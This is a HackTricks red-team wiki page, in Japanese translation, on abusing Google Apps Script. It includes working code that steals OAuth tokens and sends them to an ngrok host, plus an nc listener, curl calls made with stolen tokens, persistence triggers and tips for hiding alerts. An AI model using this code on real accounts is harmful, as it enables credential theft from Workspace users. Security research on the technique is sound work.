# GWS - App Scripts

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください。
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有する。

</details>

## App Scripts

App Scriptsは、**編集権限を持つユーザーがApp Scriptがリンクされているドキュメントにアクセスしたとき**、および**OAuthプロンプトを受け入れた後にトリガーされるコードです**。\
また、App Scriptの所有者によって**一定時間ごとに実行されるように設定することもできます**（Persistence）。

### App Scriptの作成

App Scriptを作成する方法はいくつかありますが、最も一般的な方法は**Googleドキュメント（任意のタイプ）から**、または**スタンドアロンプロジェクトとして**です：

<details>

<summary>Google Docs、Sheets、またはSlidesからコンテナバインドプロジェクトを作成する</summary>

1. Docsドキュメント、Sheetsスプレッドシート、またはSlidesプレゼンテーションを開きます。
2. **拡張機能** > **Google Apps Script**をクリックします。
3. スクリプトエディタで**無題のプロジェクト**をクリックします。
4. プロジェクトに名前を付けて**名前を変更**をクリックします。

</details>

<details>

<summary>スタンドアロンプロジェクトを作成する</summary>

Apps Scriptからスタンドアロンプロジェクトを作成するには：

1. [`script.google.com`](https://script.google.com/)にアクセスします。
2. **新しいプロジェクト**を追加するをクリックします。
3. スクリプトエディタで**無題のプロジェクト**をクリックします。
4. プロジェクトに名前を付けて**名前を変更**をクリックします。

</details>

<details>

<summary>Google Driveからスタンドアロンプロジェクトを作成する</summary>

1. [Google Drive](https://drive.google.com/)を開きます。
2. **新規** > **その他** > **Google Apps Script**をクリックします。

</details>

<details>

<summary>Google Formsからコンテナバインドプロジェクトを作成する</summary>

1. Google Formsでフォームを開きます。
2. もっと見る more_vert > **スクリプトエディタ**をクリックします。
3. スクリプトエディタで**無題のプロジェクト**をクリックします。
4. プロジェクトに名前を付けて**名前を変更**をクリックします。

</details>

<details>

<summary>claspコマンドラインツールを使用してスタンドアロンプロジェクトを作成する</summary>

`clasp`は、ターミナルからApps Scriptプロジェクトを作成、プル/プッシュ、デプロイすることができるコマンドラインツールです。

詳細については、[Command Line Interface using `clasp` guide](https://developers.google.com/apps-script/guides/clasp)を参照してください。

</details>

## App Scriptシナリオ <a href="#create-using-clasp" id="create-using-clasp"></a>

### App Scriptを使用してGoogleシートを作成する

App Scriptを作成するには、Googleシートを作成して**`拡張機能 > App Scripts`**に移動することをお勧めします。これにより、シートにリンクされた**新しいApp Scriptが開きます**。

### トークンの漏洩

OAuthトークンへのアクセスを許可するには、**`サービス +`をクリックしてスコープを追加する必要があります**：

* **AdminDirectory**: ディレクトリのユーザーとグループにアクセスする（ユーザーに十分な権限がある場合）
* **Gmail**: Gmailデータにアクセスする
* **Drive**: Driveデータにアクセスする
* **Google Sheets API**: トリガーで動作するようにする

**必要なスコープ**を自分で変更するには、プロジェクト設定に移動し、**エディタで`appsscript.json`マニフェストファイルを表示するを有効にします**。

{% code overflow="wrap" %}
```javascript
function getToken() {
var userEmail = Session.getActiveUser().getEmail();
var domain = userEmail.substring(userEmail.lastIndexOf("@") + 1);
var oauthToken = ScriptApp.getOAuthToken();
var identityToken = ScriptApp.getIdentityToken();

// Data json
data = {
"oauthToken": oauthToken,
"identityToken": identityToken,
"email": userEmail,
"domain": domain
}

// Send data
makePostRequest(data);

// Use the APIs, if you don't even if the have configured them in appscript.json the App script won't ask for permissions

// To ask for AdminDirectory permissions
var pageToken = "";
page = AdminDirectory.Users.list({
domain: domain,  // Use the extracted domain
orderBy: 'givenName',
maxResults: 100,
pageToken: pageToken
});

// To ask for gmail permissions
var threads = GmailApp.getInboxThreads(0, 10);

// To ask for drive permissions
var files = DriveApp.getFiles();
}


function makePostRequest(data) {
var url = 'http://5.tcp.eu.ngrok.io:12027';

var options = {
'method' : 'post',
'contentType': 'application/json',
'payload' : JSON.stringify(data)
};

try {
UrlFetchApp.fetch(url, options);
} catch (e) {
Logger.log("Error making POST request: " + e.toString());
}
}
```
```
リクエストをキャプチャするには、次のコマンドを実行します:
```
```bash
ngrok tcp 4444
nc -lv 4444 #macOS
```
App Scriptの実行に要求される権限：

<figure><img src="../../../.gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
外部リクエストが行われるため、OAuthプロンプトは**外部エンドポイントへのアクセス権限を求める**ことになります。
{% endhint %}

### トリガーの作成

Appが読み込まれたら、**⏰ トリガー**をクリックしてトリガーを作成します。実行する**関数**として**`getToken`**を選び、デプロイメントは**`Head`**、イベントソースは**`スプレッドシートから`**を選び、イベントタイプは**`オープン時`**または**`編集時`**（ニーズに応じて）を選んで保存します。

App Scriptsの**実行は実行タブで確認できる**ので、何かをデバッグしたい場合はそこをチェックしてください。

### 共有

**App Script**を**トリガー**するためには、被害者が**編集者アクセス**で接続する必要があります。

要約すると、作成者と招待されたユーザーが**同じ組織の場合**、**OAuth** **トークン**はファイルにアクセスする**ユーザー**に**属する**ことになります。
異なる組織の場合、**トークン**は常に**トリガーの作成者**に属し、与えられた**OAuth権限のみ**を持ちます。

{% hint style="success" %}
* 誰とでも共有するための**編集者リンクを生成する場合**、App Scriptはそれを作成した人の権限で**実行される**ので、それを開いたユーザーのトークンは取得されません。
* **組織外の人々を招待する場合**、**App Scriptはトリガーの作成者**の権限で実行されます（作成者のトークンを盗み、ドキュメントを開いたユーザーのトークンは盗まれません）。
{% endhint %}

{% hint style="danger" %}
* 自社の人を招待する場合、OAuth権限については何も尋ねられず、App Scriptはその人のユーザー権限で実行され、トークンが盗まれます。
* 攻撃者は、同じ組織の人が開く新しいまたは既存のドキュメントにApp Scriptを追加し、彼らが気づかないうちにトークンを盗むことができます！
{% endhint %}

### 共有されたドキュメントの悪用

{% hint style="danger" %}
* 外部の誰かが**App Scriptsとトリガーを使用してあなたと共有したドキュメント（App ScriptのHeadを使用していない固定デプロイメントではない）**の場合、App Scriptコードを変更できます（例えばトークン盗難機能を追加）、アクセスし、**App Scriptはドキュメントを共有したユーザーの権限で実行されます**！（トリガーが作成されたときに与えられたアクセススコープを所有者のOAuthトークンが持っていることに注意してください）。
* 内部の誰かの場合、あなたの権限で実行されます...ただ**外部の人と共有し、外部の人のメールからアクセスする**と、作成者の権限で実行されます。
* **スクリプトの作成者に、誰かがスクリプトを変更したことを示す通知が送られます**（gmailの権限を使用してアラートを防ぐフィルターを生成するのはどうでしょうか？）
{% endhint %}

{% hint style="success" %}
攻撃者が**App Scriptのスコープを変更した場合**、変更は**新しいトリガー**が作成されるまでドキュメントに**適用されません**。したがって、攻撃者は自分が作成したトリガーに設定したものより多くのスコープを持つ所有者のトークンを盗むことはできません。
{% endhint %}

### 共有する代わりにコピーする

ドキュメントを共有するリンクを作成すると、このようなリンクが生成されます：`https://docs.google.com/spreadsheets/d/1i5[...]aIUD/edit`\
終わりの**"/edit"**を**"/copy"**に**変更する**と、アクセスする代わりにGoogleはドキュメントの**コピーを生成するかどうか尋ねます**：

<figure><img src="../../../.gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>

ユーザーがコピーしてアクセスすると、**ドキュメントの内容とApp Scriptsがコピーされます**が、**トリガーはコピーされません**ので、**何も実行されません**。

### Webアプリケーションとして共有する

**App ScriptをWebアプリケーションとして共有する**ことも可能です（App ScriptのエディタでWebアプリケーションとしてデプロイ）。しかし、このようなアラートが表示されます：

<figure><img src="../../../.gitbook/assets/image (148).png" alt=""><figcaption></figcaption></figure>

必要な権限を求める**典型的なOAuthプロンプトに続きます**。

### テスト

収集したトークンでメールをリストするテストは以下のように行います：

{% code overflow="wrap" %}
```bash
curl -X GET "https://www.googleapis.com/gmail/v1/users/<user@email>/messages" \
-H "Authorization: Bearer <token>"
```
ユーザーのカレンダーをリストする：
```bash
curl -H "Authorization: Bearer $OAUTH_TOKEN" \
-H "Accept: application/json" \
"https://www.googleapis.com/calendar/v3/users/me/calendarList"
```
## App Scriptを使った永続性

App Scriptを作成し、X時間ごと（例えば、毎分、毎時、毎日など）にトリガーするように設定することも可能です。**被害者の資格情報やセッションを侵害した攻撃者は、App Scriptのタイムトリガーを設定し、非常に特権的なOAuthトークンを毎日漏洩させることができます**：

App Scriptを作成し、トリガーに移動して、トリガーを追加をクリックし、イベントソースとしてTime-drivenを選択し、最適なオプションを選択します：

<figure><img src="../../../.gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
これにより、セキュリティアラートのメールと、これについて警告するモバイルへのプッシュメッセージが作成されます。
{% endhint %}



### 共有ドキュメントの未検証プロンプトバイパス

さらに、**共有**されたドキュメントに**編集アクセス**がある場合、ドキュメント内に**App Scriptsを生成**することができ、ドキュメントの**所有者（作成者）がApp Scriptの所有者になります**。

{% hint style="warning" %}
これは、編集アクセス権を持つ人がそれに内部で作成する任意のApp Scriptの**作成者としてドキュメントの作成者が表示される**ことを意味します。

これはまた、ドキュメントの作成者のWorkspace環境によって**App Scriptが信頼される**ことも意味します。
{% endhint %}

{% hint style="danger" %}
これはまた、**App Scriptが既に存在していて**、人々がアクセスを**許可している**場合、ドキュメントに**編集者**権限を持つ人はそれを**変更し、そのアクセスを悪用することができる**ことを意味します。\
これを悪用するには、人々がApp Scriptをトリガーする必要があります。そして、一つの巧妙なトリックは、スクリプトをウェブアプリとして**公開する**ことです。App Scriptに**アクセス**を許可した**人々**がウェブページにアクセスすると、彼らは**App Scriptをトリガー**します（これは`<img>`タグを使用しても機能します）。
{% endhint %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)で<strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksに広告を掲載したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手してください。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをご覧ください。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**してください。
* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)や[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを共有してください。

</details>
